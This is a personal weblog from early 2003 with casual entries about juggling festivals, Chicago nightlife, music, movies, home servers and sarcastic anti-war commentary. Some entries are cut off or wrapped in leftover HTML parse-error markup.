                <p>So dyaln flew into town on friday morning. We hung out at my work for a bit and then we went to lunch. Dylan then went to my apartment and hung out with matiss and took a nap. I cam e home and it was off to the juggling fest. Whee. as you might or might not know, stevenson juggling festival was this weekend. It is a juggle fest at a northern suburban high school it is a huge highschool.. veyr large.. so anyway.. we went to the juggling fest and juggled a bunch it ruled quite a bit. We met up with my friend mark and hung out.. dylan learned a bunch of new unicycle stuff and generally was a cool brother.. while matiss was a bad bad bad brother.. like always&#8230; so anyway..<br />Saturday we went back to the fest and juggled all day. dylan hung out with our friend mark and brian while matiss and myself went to beck&#8217;s birthday party(fun fun) and then we came back just in time to watch the Toss Up show(it was ok). Some of the guys were insane. <a href='http://www.patrickmcguire.net/'>Seriously insane</a>. So we went to a really poor putt putt golf place and played a very quick game of putt putt and then went home and slept. <br />Today.. we went to the fest and dylan ruled the unicycle mounts.. I should really learn that stuff.. I have this dream of going to work on a unicycle. it might rule. I don&#8217;t know yet ;)<br /><br />so pictures and movies will come soon. I gotta put the videos together.. ;) hehe. <br /><br />well I am damned tired. so sleepy.. juggling so much will make you very very tired.. ;)</p>

Noel sent <a href='http://www.channel4.com/gayometer'>this gayness test</a> in.. I am apparently 46% gay. wow surprise there huh ;) one of my coworkers sent <a href='http://personal.nbnet.nb.ca/merzo/'>this "Starship Dimensions"</a> site to me. It is rather fun. Mostly because their are soooo many space ships.. <br /><br />This weekend made me(and my brother apparently) want a miniDV cam. I think it would be fun. Right now I am happy using my digicams to capture the 30 seconds of crap video that they capture. But I want to ROCK.</p>

                <p>So I sit her at almost three in the morning with one show off and one shoe on. I have not been home since eight this morning and I have just arrived. I realize that doesn&#8217;t really make sense.. but whatever. Anyway.. today was weird - I had two rather pivotal meeting at work and about other work.. as well as really got some good stuff done at work.. I then left work to go to the ministry show which started at an ungodly six o clock and on the way I saw the aftermath of some horrible wreck or engagment. Basically on the floor of the street were two horribly mutalated people and a bunch of blood. now the internet has shown me some horrible horrible things.. but I have never seen this much blood in real life. it stained the street for about a 2 foot radius. it was spooky. both patrons of the injuries were not moving whatsoever and a crowd had gathered. it was so weird, both the fact that their was actual dieing injured people and the fact that their was a crowd gathered. The city is sometimes scary. I wonder if they got hit by a car or something. nobody knows. I forget how fragile our bodies really our. I AM INVINCIABLE(spelled correctly). Then I went to the ministry show.. which honestly could have been a lot better. the songs that mattered were OK but I think Al is getting quite to old for this nonsense. He seemed to forget the words to songs.. and worse.. I felt embarrased for him. After the ministry show.. I went with matiss and beck to get food and then to spy bar.. where I talked to some friends and met and talked to this really cool girl.. well I am sleepy.</p>

                <p>So today I went to a building that was a little over two blocks away to pick up a dell server(~$alot of money) that was mis-delievered to another company. heh. Like fed-ex &#8220;accidently&#8221; dropped it off at a completly unrelated place. wtf. and the best part is that the other company totally signed for it ;)<br />hehehe.. I giggled the whole way. the best part was that we were totally incompentent at navigating the building. couldn&#8217;t find elevators.. got stuck in doors.. etc etc<br /><br />i got a <a href='http://nata2.info/pictures/harper/me/haircut%20026.jpg'>new</a> <a href='http://nata2.info/pictures/harper/me/haircut%20023.jpg'>haircut</a>. I rule.. <br /><br />speaking of dell.. maybe I will fix up my new servers.. I don&#8217;t really know what to do about the firewall one though.. I mean.. I thought about using the mandrake firewall.. but I am kinda sketched out about whether it will work well.. versus building one from scratch. I am jsut afraid that a box like the mandrake one will have all sorts of functionality that I won&#8217;t need.. <br />stupid distributions<br /><br /></p>

<p>Sign up for <a href='http://friendster.com'>friendster</a>.. find me and message me.. I will add you to my friend list.. it will be fun. I promise.</p>

                <p>This weekend was fun. it also passed in a blur. on friday night I went to the silliest party I have been to in a long time. It was for a movie casting - however none of my friends or myself new that it was a movie casting - so we just hung out and got free drinks.. such a silly thing.. so dumb. everyone with their head shots.. trying to impress no one in particular.. hopeing they would be seen.. it was funny.. then we went to big wig to see my friend mark spin.. I like his music.. it was nice as well.. then I slept. I like sleeping. it is often the best part of going out.. <br />then today, or yesterday, we went to Sonotheque and chilled for a bit and then we made our way to transit.. transit was insane. all velvet ropes and such.. so funny. then we went to my house and chilled and everyone just left.. and it is six thirty.. and I have to sleep. so hoepfully I get up at a reasonable time and am able to do my servers.. ;) so I will see yall around 4 ;)<br /><br />i often find the need to sign my entries.</p>

                <p>last night I had another apocalyptic dream.. I really shouldn&#8217;t say another.. it isn&#8217;t like they are repeating.. the last one was two years ago or so. but they are insane and kinda fun. this one started out with me being in a symphonic band practice. I was playing bari-sax.. I was not good - so the band director yelled at me. I was sad. but for some reason I didn&#8217;t have the music we were attempting to sight-read. but whatever&#8230; stupid band.. so then he kicked me out of band and made me drive back home accompanied by the best saxaphone player(who is annoying). so all the way home we are talking and he is berating me about not practicing and I am telling him that I have other priorities.. so then we approach an small agricultural center in the middle of the road. and we see these huge smoke plums flying on either side of the grain elevators.. it was very strange.. so we took caution. we drove into the center and saw a bunch of bulls running around(at this time the road has basically turned into a rodeo stadium). The sky was very dark and the bulls and cattle were running all about and breaking stuff. we may have hit one with our car.. which was a bad plan.. cuz then we had to run to the end of the stadium and try and escape. we escaped but when we exited the stadium we noticed the baren landscape the followed. as we made our way down the broken road two half dead men jumped out and blocked the way with home made crosses. on each cross was a gas mask. gas masks were also worn by each of the men who jumped out. They didn&#8217;t put up ANY resistence and we pushed them out of our way. we walked down a path and noticed the mood of a lot of death. somehow we got into a car.. and then it ended. <br />i woke up.</p>

                <p>so this weekend was nice. Friday we went to redno and just hung out. the music wasn&#8217;t thrilling.. but it was entertaining. a bunch of old house and club music.. always entertaining. I think I even heard nelly.. which is funny. I ended up getting a bit drunk do to the long island ice tea that was purchased for me. The best part about the night was the company.. some of my good new friends and some good old friends were all there. it ruled. so fun. <br /><br />then on saturday I went to a party and hung out with my rooamtes and then met a really cool kid who is a dj and knows a bunch of the same people as me. that was nice. it is always nice to meet people who are dope. and who are already involved in the scene but are into different things. <br /><br />tonight I went to some friends house(new friends.. but still friends) and ate dinner. it was a great time.. good food. fun conversation.. you know the drill. a lot of nice people. heh. I like chicago. I am a dork. both echoed in the same breath eh.. <br /> weird.<br /> i need sleep.. and I need to turn off the four computers I have in my room.. I doubt the radiation is doing anything good for me. I guess in the best circumstance I will be able to survive the upcoming nuclear war ;)</p>

                <p>I just watched 8 mile. it is good. a little over acting a little underacting. but eminem is not an actor so it is a rather good movie.. I enjoyed it. he does have quite a bit of anger. a lot of anger.. over simple things.. it is sad..<br />tonight I think we are going to watch a bunch of movies. it will be fun. the window is open in my room and in my living room. it is soo soo nice outside. today was beautiful. when I got home tonight it was 73 degrees.. so so so nice. I liked it.</p>

                <p>So I went to an oscar party tonight. I showed up and suddenly realized that my rocker charade was not going to cut it at the formal party I found my self at. Heh. my friend carl was like.. are you the hot guy or the weird guy.. well I was the weird guy.. but soon I became the hot guy.. oh so hot.. <br /> so the oscars.. I am so glad michael moore said what he said. it is imaportant to get that message out to soo many people.. even if they did boo him. here is a small portion: <blockquote><small>"We like nonfiction and we live in fictitious times. We live in a time where we have fictitious election results, that elect a fictitious president. We live in a time where we have a man sending us to war for fictitious reasons,"</small></blockquote> Whoa.. eh.. yea. totally. <br /><br />i had a good weekend. overall it turned out really nice. I made a new friend which is exciting. usually in the city it is very hard to make friends. something always seems to get in the way. but hopefully this new friend will be real and good.. whatever. I need sleep. I am now 25.. wheee.. <br /><br />i am so frustrated at this crap about the american <a href='http://war.watership.org/link.php?lid=772'>POWs</a>. I mean it sucks that they were taken prisoner.. however.. it is a frickin war. I mean seriously what did we expect. Did we think it was going to be candy and sunshine the whole time? Stupid tupid united states public. the dead bodies that were shown possibly died during COMBAT. maybe they were not abused, tortured and all that. maybe they died while FIGHTING FOR OIL. Maybe we should show pictures of our iraqi POWs. the tens of thousands that we expect to have. What about <a href='http://war.watership.org/link.php?lid=757'>this</a> picture.. they have a flag of surrender.. where are the human rigths violation in shooting them in the head. Oh right.. iraqis are not human.. I forgot.. jesus.. this is so stupid..</p>

                <p>Today is my 25th birthday. I am happy. Last night I hung out with a bunch of cool cats and we went to iggy&#8217;s and ate dinner. we got there about 11:50 so it was a good time. I drank beer and coke - not together.. mind you.. I am not like some of my friends.. hehe.. ;). it was fun. they sang happy birthday to me.. and succeeded in embarrasing me slightly. I like that. <br /><br /> WW3 seems like it will get the kick it needs.. <a href='http://www.news.scotsman.com/index.cfm?id=343442003'>North Korea</a> is pissed nuclear style.. and best of all - in the land mass catagory: China is mad, russia is mad and india is mad. and those are just the countries that are speaking out. RULE<br /><br />Tonight I think I am going to go out with some friends. I really need a nap. I was up really late last night working hard on some website stuff. it suxored cuz it was hard. but in the end - it turned out fine. well sorta fine. there is still a lot of work. <br /> but like all work.. it will figure itself out..</p>

                <p>The situation with that girl that was abducted in salt lake city is poised to become very very strange. I mean she was gone for quite a long time. anything can happen in that ime - <a href='http://drudgereport.com/smart.htm'>including befriending ones abductors</a>.. thus patty hearst.. I guess it is probably psychological. but it still makes for a insane story. <br />I think that the US should look at mormans as insane after this. The young girl was married to her abductor in a <a href='http://www.msnbc.com/news/884413.asp'>crazy billigimist marriage</a>. She is 15. wtf. But the weird thing is - she was able to <a href='http://www.washingtonpost.com/ac2/wp-dyn/admin/article/largerphoto?contentId=A23106-2003Mar13&amp;thisnode=nation/states/ut'>leave numerous times and didn't</a>. <br /><br />i really want to travel. I wish that companies in the US were more into travel and vacation - I would love to take a month or two off and goto asia before it is nuked &#8211; but I don&#8217;t want to quit my job. so what are my choices. quit. see it is dumb. I mean I haven&#8217;t really mentioned anything to anyone.. so they may be into it. but I just thought of this tonight.. so it really isn&#8217;t a plan or whatever. <br /><br />yall should check out <a href='http://www.friendster.com/index.jsp'>friendster</a>. it is pretty cool. slow as the dickens.. but a neat idea. kind of a sophisticated makeoutclub. and hopefully not run by skins ;)</p>

I have never been as scared watching a movie. it is insane. So So scary. it is just nuts. I wonder if the US version is the same. hmm.. but yea. really really scary.. I think it was quite possibly the scariest movie to watch I have seen as of recent.. whoa.. I don&#8217;t think it will be a lingering fear.. but I will see soon.<br /><br />man..</p>

                <p>I have needed to update this site for so long. I guess really since last thursday. So last thursday I went out with some friends.. maybe a little too late.. it was all my poor little body could handle. I was horribly sick the next day and had to stay home from work.. which sucks.. cuz work is cool right now.. but whatever. so I slept most of the day - but was supposed to drive to Champaign/urbana for a juggling fest around 11 at night. I ended up doing that.. however I lost ALL of my mp3s off my ipod right before I left. I was able to get msot of it back .. but the cds I wanted to listen to I had left at work. so I was really pissed. HOW annoying. so we left for champaign adn arrived and slept at our friends house. we went to juggling the next day. it was fun. I hung out with some really cool cats and learned how to do a top. that night we all went to a nice mexican resturant and one of the cool jugglers paid for our dinner. he is great. it was like 13 people or something insane. Then we went to a juggler party in an insane house with thousands(well 10 or so) arcade games. it was like having a party at an arcade. it was quite funny. matiss and I hung out with mark and jsut bullshitted.. hah. so fun.. then back to juggling.. adn then to chicago.. and then to the computer where I made a new site.. <br /><a href='http://war.watership.org/'>war.watership.org</a><br />This site is a link log of all the crazy news articles I read about the war. I also made a bunch of <a href='http://www.dopeman.org/ads/'>ads</a> as well. I don&#8217;t know about them. they are supposed to be in a magazine.. wheee<br /><br />i am tired now. I need to go home and sleep.. actually clean.. my apartment is so messy and gross right now</p>

                <p>So for the past week or so I kept seeing <a href='http://i.cnn.net/cnn/2003/WORLD/asiapcf/south/03/06/bin.laden.alive/story.ksmohammed.ap.jpg'>this guy</a> in newspapers, on websites and on tv and I thought <a href='http://www.ronjeremy-themovie.com/'>ron jeremy</a> had gotten arrested. I guess I never actually <a href='http://edition.cnn.com/2003/WORLD/asiapcf/south/03/06/bin.laden.alive/index.html'>paid attention</a>.. when I finally did.. boy was I disappointed.<br /><br />I recently got the new <a href='http://www.cursivearmy.com'>cursive</a> album. It has a couple allusions to <a href='http://nata2.info/humor/bush/GeorgieW.swf'>pinocchio</a>. weird. eh. that flash thing is cool though. Anyway.. the new cursive album is quite good. I enjoy it. I think it is weird that I buy a lot of cds. I mean I should/could jsut download everything from the intraweb or whatever. I guess I just feel better owning the actually cd. oh.. I relaly like the song &#8220;the gentleman caller.&#8221; Have I mentioned that <a href='http://saddlecreekrecords.com/'>saddle creek</a> rules. I also picked up a <a href='http://www.speakeasy.org/~pjohnson/bright/bright.html'>bright eyes</a> disc. I don&#8217;t know what I think - however it is certainly growing on me. oh. the ipod is still one of the coolest things in the world. I don&#8217;t understand how someone could not have one. especially if they like music. the fact that I have 400 or so cds with me most of the time rules. I have been listening to so much music now. it is quite something&#8230; so nice. <br /><br /><a href='http://nata2.info/humor/pictures/laulaja.jpg'>whoa</a>. this weekend is a big juggling festival. I am excited.</p>

                <p>So this weekend was incredible. It was also INSANE. seriously. on friday I hung out with a bunch of <a href='http://nata2.info/?path=pictures%2Fshows%2Fladytron_2003'>friends</a> at the ladytron show. Which btw, was really great. ladytron did a remarkable job of representing their sound exactly how it is on the record. Dayum.. that concert was such a fashion show.. heh. so fun. my friend rachel came with.. which was cool.. I haven&#8217;t seen her in such a long time. so that ruled. <br />then came saturday and the absolute insanity that is the <a href='http://superstarsoflove.com/index8.html'>super stars of love</a> and <a href='http://www.modsquare.com/laptronica'>laptronica</a>. it was so nuts. check out pictures <a href='http://nata2.info/?path=pictures%2Fshows%2Flaptronica_march_2003'>here</a> or <a href='http://chris.fm/lap.html'>here</a> (basically both have the same content).. but yea. it was insane.<br /><br />so apparently north korea is attempting to <a href='http://timesofindia.indiatimes.com/cms.dll/xml/uncomp/articleshow?artid=39110877'>start</a> a <a href='http://www.washingtonpost.com/wp-dyn/articles/A30106-2003Mar2.html'>thermal nuclear war</a>. I don&#8217;t quote understand Kim Jong Il&#8217;s logic within his rhetoric. wtf. &#8220;he saddam, I will be your human shield.&#8221; insanity. so apparently the war will <a href='http://www.thesun.co.uk/article/0,,2-2003100298,00.html'>start</a> as soon as next thursday. oh.. and surprise surprise.. <a href='http://www.worldtribune.com/worldtribune/breaking_9.html'>saddam is now</a> within range of US troops. is that because we are planning on invading so we have moved within range.. rather than saddam beefing up his forces? nobody knows.. heh. I know.</p>

                <p>I for some reason had an aversion to updating my website this week. I think it was cuz I was so busy at work. serious. I was crazy busy. and it was frustrating things I was doing. for some reason - everything I tried to do didn&#8217;t work. I was annoyed. and most of the stuff was just stupid. heh. like I had done it one hundred times before and none of it worked this time. dumbass things. hehe. but it kept me real busy for the whole week.<br /><br />Looks like britney is <a href='http://www.thesun.co.uk/article/0,,4-2003092151,00.html'>going down</a>.. eek.. I mean.. uhh.. yea.. <br /><br /> So the war on terrorism drags on. jesus this is an annoying war. all it does is destroy the america that everyone spent so much time building. The world is speaking and we are not listening. and now people are starting to <a href='http://www.post-gazette.com/businessnews/20030228sorosbp4.asp'>realize</a> that this is not a good plan. But - what is a <a href='http://www.nypost.com/news/nationalnews/55282.htm'>good plan</a>. I really don&#8217;t know. I mean.. saddam is a bad man. but is he hitler bad. is he bad enough to cause a world war? is he actually as bad as bush wants us to think. or is he just a bully that beat up bushes father? This is a <a href='http://news.ft.com/servlet/ContentServer?pagename=FT.com/StoryFT/FullStory&amp;c=StoryFT&amp;cid=1045511186751&amp;p=1012571727092'>rather</a> <a href='http://story.news.yahoo.com/news?tmpl=story&amp;u=/ap/20030227/ap_on_re_mi_ea/congress_iraq_2'>expensive</a> war for pride&#8230; I think what I am worried about is that the US will have a hell of a time recovering from this incident. It is not dissimilar to the schoolyard bully getting beat up by another bully who happens to be in a grade or two lower. The older bully will never be looked at the same.. I am afraid that we will all be dealing with the repercussions of this for a long long time. I just hope it isn&#8217;t <a href='http://ready.gov/nuclear.html'>nuclear</a> <a href='http://www.wagingpeace.org/articles/babst-%20preventingnuclearwinter.htm'>winter style</a>. that would be <a href='http://www.nbvf.com/'>sad</a>. but luckily nobody <a href='http://www.buzzflash.com/analysis/03/02/26_Ari.html'>believes</a> the <a href='http://www.whitehouse.gov/news/releases/2003/02/20030225-9.html#18'>truth</a>.

                <p>i really need to upgrade servers. I need like 3 more. One for a firewall, one for web hosting and one for backups. That would rule. <br /> i price them at around 4k. So if anyone wants to give me 4k. I would be happy ;)<br /><br />So apparently <a href='http://audreyhacking.com'>audreyhacking.com</a> is in <a href='http://wired.com'>wired</a> this month. Somewhere around page 75. I really need to go and buy a copy. I will put some scans up. Some people are moving in or something downstairs and it is driving me up the wall. they are bummping around and thumping a lot. it is worse than music. it is so sporadic. <br /><br /><a href='http://www.cnn.com/2003/US/02/21/nightclub.fire/'>omfg</a>. hahah.. stupid great white. it is apparently not a good week to go to night clubs.<br />stupid war. man the government is dumb - after popular culture has made fun of the pathetic movies made in the 40s and 50s about nuclear war - the government went ahead and <a href='http://ready.gov/'>did it again</a>. this time it includes chemical warfare as well. I mean how stupid do they think we are. obviously rather stupid. wtf. Well not as stupid as the <a href='http://www.cbsnews.com/stories/2003/01/18/iraq/main537096.shtml'>U.N. think the U.S. is</a>. I think it is interested to hear EVERYONE talk about <a href='http://slate.msn.com/id/2077874'>how stupid the french</a> are for trying to speak out against the U.S. and our plans for war. Why don&#8217;t we listen rather than say <a href='http://ehowa.com/pic/chiracpoem.jpg'>they are dumb</a>. I mean really do we want all the countries of the world to act like the british and become puppets of bush. Cuz obvously bush knows what <a href='http://nata2.info/humor/bush/bushpick.mov'>he is doing</a>. I mean.. I am totally excited for <a href='http://www.ki4u.com/nuclearsurvival/states/il.htm'>world</a> <a href='http://www.doonesbury.com/strip/dailydose/index.cfm?uc_full_date=20030220&uc_comic=db&uc_daction=X'>war</a><br /><br />I have been listening to isis a bunch lately. It is very good. I want to start a music review site. I think I coudl do a good job. it would be music and shows I think. maybe like <a href='http://www.riottech.net'>riottech</a> but with a LOT more community. I have taken to capitalizing words that I want to emphasize. but I my typing looks like this:<br />Hey WHAT is up. I am REALLY bored.<br />and then I feel like such a <a href='http://nata2.info/humor/bush/badman.jpg'>dork</a>. <br />If you haven&#8217;t watched <a href='http://nata2.info/war/AC-130U_gunship_video_hi.mpg'>this</a>, do so now.

                <p>with the US targeting a bit of aggression towards france.. I am reminded of my dream of <a href='http://www.webpal.org/language/index.htm'>nuclear war</a>. Ever since I saw red dawn when I was little - I have been scared of world war. and now we get our chance. I hope we don&#8217;t screw this up. <br /><br />I am not really crazy. I just think that our world is inane rigth now and needs some humor in it. like wtf is bush&#8217;s deal. is it cuz his dad was picked on by saddam. is it because bush is a pseudo cowboy and feels the need to be a bully. is it cuz he was coked out of his mind during all his foreign policy lectures at college. I mean seriously. I don&#8217;t think a high school kid that just finished senior world coloring could be making such silly moves as him. Now I don&#8217;t think that bush is necessarily stupid - I am just amazed at what he says and does. How did he get elected. How did I get elected. <br /><br />i really shouldn&#8217;t be allowed to sleep ritgh after work. I get a little &#8220;ranty&#8221; later at night ;)</p>

                <p>I like watching study tv shows. like news programs or talk shows. cuz the TV magic is so artificial. It is so obviously created in a enclosed little box. For some reason it is aluring. oh.. btw the deer hunter is a crazy movie. it is on tv right now. so strange. war is a terrible thing. duh. <br />heh. the faint is being played on MTV. rule.

                <p>I just finished watching Donnie Darko. It was quite the movie. I enjoyed it. I thought it was humorous that on halloween - they were showing the last temptation of christ - a movie that isn&#8217;t necessarily halloweenish. It is also funny how similar donnie darko was to this movie. Heh. I smiledwhen they showed clips of evil dead. I really enjoyed the movie. I liked the music and how the sound interacted with the plot. It was insane. I did think it was dumb when frank took off his mask. I mean it did associate frank with humans which was key - but the makeup was kinda bad for a movie whose special effects seemed rather elegant. <br /><br />apparently donnie darko is about divine intervention.</p>

                <p>so <a href='http://www.washingtonpost.com/wp-dyn/articles/A20689-2003Feb17.html'>a club broke</a> and <a href='http://www.nbc5.com/news/1981489/detail.html'>many people died</a> last night. My parents called at 7:30 to make sure I was alive. 7:30. that is so early. anyway.. I can totally imagine that happening in many of the clubs I have been in. they all have ONE entrance or exit and it is usually very small and around a lot of stairs. Friday I went to REDNO5 and their was a slight scuffle on the landing of one of the staircases and some people fell&#8230; I couldn&#8217;t imagine what would happen if everyone wanted to leave. I think the most screwed up part is that the cops react so violently - thinking that the people are ALWAYS wrong. I can imagine it easily - two cops arrive and see people streaming out - so to contain the situation they order everyone inside. wtf. why didn&#8217;t they listen to the people.. well I guess they need to make sure they have a closed quarters for the &#8220;crime.&#8221; but wasn&#8217;t the crime having the rest of the doors locker? whatever. I wonder what the repercussions of this will be&#8230; Sometimes really <a href='http://www.sbsun.com/Stories/0,1413,208~12588~1181610,00.html'>crazy things happen</a><br /><br />i wonder how the protest went this weekend. I hope well. I really wanted people to take notice. I should have been their but I was sleeping.. hah&#8230; whoops.. I am totally against the war though.. I mean unless it gets in the way of my beauty sleep. which I need so badly - especially since I have replaced food and normal sleep with GTA vice city. <b>;)</b></p>

<p>sweet huh<br /><br />I love the our leaders ability to really fudge certain things.. like the propaganda that they are spewing. it would be better if the propaganda didn&#8217;t fall apart within fifteen minutes of them presenting it. good propaganda and spin needs to last for the duration of the conflict. how are the america people let alone the U.N. and NATO going to believe all this BS about Iraq and terrorism if the stories don&#8217;t break down into not so complex <a href='http://abcnews.go.com/sections/wnt/US/terror030213_falsealarm.html'>lies</a>.

                <p>So washington is <a href='http://www.wtopnews.com/index.php?sid=44468&nid=25'>prepared</a>.

It would be insane. I am not ready fo that. I am ready for <a href='http://www.washingtonpost.com/wp-dyn/articles/A62869-2003Feb12.html'>this</a> however. wow. that could really change the dynamics of our foreign policy. maybe bush&#8217;s missile shield should be a priority. hah. umm. that is a joke.. yea.. a joke&#8230; speaking of jokes.. <a href='http://story.news.yahoo.com/news?tmpl=story2&cid=127&e=7&u=/030211/7/38rtp.html'>here</a> is a little piece about my life. I hate student loans. they are one of my only burdens. my life would RULE if it wasn&#8217;t for these bain. the author of that piece makes a good point about the IRAQ war. If we targeted educatoin rather than monopolizing the WORLD with our drivel - we may be able to save future generations from the same fate that has befallin myself. <br />It is very interesting to how different organizations <a href='http://www.internalmemos.com/memos/memodetails.php?memo_id=1329'>leech off of certain events</a> in our strange world. In that case - clearchannel is preparing for war. but not in ways a normal person would expect. they are planning to engage the public to gain <a href='http://www.washingtonpost.com/wp-dyn/articles/A59829-2003Feb11.html'>ratings</a>. heh. I love capitalism. I mean seriously. I love it.<br />There is an <a href='http://www.washingtonpost.com/wp-dyn/articles/A61347-2003Feb12.html'>imminent terror threat</a>. Maybe if we didn&#8217;t react like such &#8220;woosies&#8221; when we are attacked - terrorism wouldn&#8217;t work against us. but <a href='http://www.whitehouse.gov'>certain</a> <a href='http://www.gwbush.com'>people</a> are &#8220;cowboys&#8221; and react in a very very stupid way. check out how reilly <a href='http://www.whatreallyhappened.com/Glick_56.wmv'>reacts</a>. These are the people who are running our country. completely unable to learn and listen from others. unable to communicate. only able to strike. <a href='http://nata2.info/humor/bush/our_leader.gif'>only able to kill</a>. and only if there is a buck to be made in the end. <br />i think my favorite part about bush is how his economic plan and how he is alienating all of the people in the US except his rich friends. I read a figure where 97% of the american people will not save more than $1000 from his tax cuts per year. $1000/year is not much for a family with children. a family who is not very wealthy. Check out the back page of the most recent new yorker. it explains it.<br /><br />oh.. for those of you who watched the jacko special. check <a href='http://www.ftrain.com/my_name_is_blanket.html'>this</a> out.<br /> <br />last night I stayed out way to long. I did the same on monday night. hopefully tonight I will stay out not so late. or maybe just relax. jesus I am tired. I also recently discoverd the magic of the div tag. wtf. why didn&#8217;t I know of this before. always playing with tables and all that. I am dumb.</p>

                <p>so I have been thinking up this journal entry for a couple days. I entered it yesterday - but I reboot my server and then was like.. hey I will press submit and lost it in the resulting downtime.. ugh.<br />anyway.. I have a theory. it is this: so bush declared terror level orange and now their are security dogs on the blue line at all times. I think the two are related.. <br />so it isn&#8217;t a very good theory. maybe that is why I wan&#8217;t ever to post it. a better theory is the one about the space shuttle blowing up. It is that bush knew the space shuttle was goign to have problems and rather then fix it he let it explode to overshadow his foreign policy problems. and then he uses the explosion to start the mars exploration <a href='http://www.lunaranomalies.com/prometheus.htm'>inititive his father was all into</a>&#8230; yea.. its true<br /><br /><a href='http://www.washingtonpost.com/wp-dyn/articles/A56248-2003Feb11.html'>wow</a> what a relevation.. and I got my <a href='http://www.usatoday.com/usatonline/20030211/4854954s.htm'>emergency plan</a> at target.</p>

                <p>man. I had a rough weekend. I am so so tired. t I r e d . . <br />this entry will be composed of me complaining.. just letting you know ;). I have been sick since tuesday. and I can&#8217;t get better. for some reason - it sucks. I think I lead a unhealthy lifestyle.. mostly in terms of eating. but smoking crack so much certainly doesn&#8217;t help. <br />So yesterday miriam left for cologne. I am sad.. I will miss her.. <br />so I bought vice city. it is fun. <br />i am tired. I just had a frustrating meeting</p>

No sense at all. and they are really buses.. acting like trains. not trains at all. slackers&#8230;<br /><br />bush is kinda dumb<pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;i have no doubt that this &quot;state of the union&quot; nonesense will only get us into trouble.

I would. I would get really pissed and I would point my gun at him and say. drop your bat. rather than say. hey. I won&apos;t hit you. this is a dumb analogy. it is going no where fast. whoops there it went&lt;br /&gt;&lt;br /&gt;kinnera is mad cuz I don&apos;t mention her as much as I used to. well punk.. move to chicago. that is what I say.. sucka.. &lt;br /&gt;&lt;br /&gt;Miriam leaves in a couple days. it is sad. I need to go visit. and I just found out that my friend sebastion may live in cologne which is where miriam lives. I have got to get me a vacation to germany. yea.. and one to paris. and one to hong kong. and especially one to that condo I am gunna buy. oh and one to the get your loans paid off office. yea that one.&lt;Br&gt;&lt;br /&gt;i love h&amp;amp;m. chicago will soon get one. and everyone will start to dress the same.

I am going to use a multiple hundred thousand dollar search engine to catalog and search my MP3s later tonight. it should be VERY interesting. I want to do it as a demo. I am excited. wheee. I do have a lot of death metal too.. I love my IPOD. it is my friend. and yours too.. &lt;br /&gt;my phone is broked. wtf. </pre></p>

                <p>Well. I go home today. I am excited. I love sleeping in my own bed. so nice. and it will be the first time in awhile. Last night I exported my IPOD music db to a comma delimited file and imported it into endeca(the search engine I am at training for). This was a fun exercise - it showed me a bunch of neat things&#8230; like how much music I have ;) You can really get a nifty view of your data when you look at it with good tools. wow that is an intelligent sentence ;)<br /><br /></p>

U.S. foriegn policy rules. ANd apparently the <a href='http://www.washtimes.com/national/20030124-14721132.htm'>domestic policy</a> also rules.. the <b>former</b> U.N. weapons inspector Scott Ritter was charged awhile back with luring a 16yr old girl to a resturant - where this gets interesting is that ritter is charging that this arrest was engineered by bush and bush&#8217;s followers as a diversion to ritter&#8217;s proposed alternative to a violent altercation in IRAQ. This is very interesting. wtf. <a href='http://www.bushwantswar.com'>BUSH WANTS WAR</a>.</p>

It was and always is quite something. The show on saturday noght was really great. heh. so much fun. ;) - I learned a bunch of new tricks and hung with a bunchf of really cool jugglers. Matiss and I almost won the seven club passing endurance - however the kasemans beat us again.. we went 4:40 and they went 4:45.. someday.. we will triumph.. ;) <a href='http://nata2.info/?path=pictures%2Fjuggling%2Ffestivals%2Fmadfest_03'>here</a> are pictures</p>

But no one can deny that saddam is <a href='http://www.washingtonpost.com/wp-dyn/articles/A6081-2003Jan17.html'>strangely in violation of something</a>&#8230; but there is still <a href='http://story.news.yahoo.com/news?tmpl=story2&cid=597&e=18&u=/nm/20030117/tv_nm/television_simpsons_dc'>hope</a>.. but not for this <a href='http://www.iol.co.za/index.php?art_id=vn20030117055428478C700783'>not so intelligent man</a>.</p>

I mean obviously everyone from egypt is a terrorist.. and everyone from Bangladesh is a terrorist and everyone from  Jordan,Kuwait, Iran, Iraq, Libya, Sudan and Syria are terrorists. could you imagine the problems that would occur if france required all U.S. citizens to register. heh. bush would get all upset and maybe say some dumb words. or somthing.

                <p>Last night a friend of mine gave me a couple tickets to the interpol show at the metro. it was a good time. I hadn&#8217;t really heard them and they did put on a good show. it was nice to see and I was able to see soem friends and all that.. wee.. I should get my ipod today. I am excited. I am redoing my MP3 attitude.. I am gunna be setting up a centralized MP3 system for our apartment. I am kinda excited about the prospects.. heh. whatever. <br /><br />on friday we all hung out and watched movies.. ate pizza and just chilled. it was funny - because I forget how much of a nerd I am - and my friend brock brought a friend over and I don&#8217;t think she was into the &#8220;weird&#8221; movies that matiss and I were representin&#8217; - I laughed. I wonder what happens when people start hanging out with us. do they think we are insane. cuz are collection of entertainment is very &#8220;interesting..&#8221; in light of that.. my illuminati game should be arriving soon ;)<br /><br />i am reading a book by Neil Gaimen called America Gods. I don&#8217;t like it as much as I liked neverwhere, which is making me sad. hopefully good omens will be better. I enjoy my new style of reading: cluster reading. it is where I read a bunch of books by the same author all in a row. it is quite interesting. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>i need to go get some food. I haven&#8217;t really gotten food at the grocery in at least three mmonths. I think that this is rediculous.

I suppose I could just &#8220;program&#8221; my weblog to spell check itself.. but whatever.. I am not THAT bored currently. Tonight I had a big meeting with a &#8220;client&#8221; of mine. it went really well. I like it when business goes well. I then went to a rock show -cursive. I like cursive, but I am tired of the woe is me I am a sad indie rocker who has a girlfriend who hates me.. lalalal.. I wish it was more dynamic like.. &#8220;woe is me the government is oppressive.&#8221;<br />hehe. anyway.. I am sad.. cuz I was supposed to hang out with miriam.. but it didn&#8217;t work out.. :( whatever.. soon enough&#8230;</p>

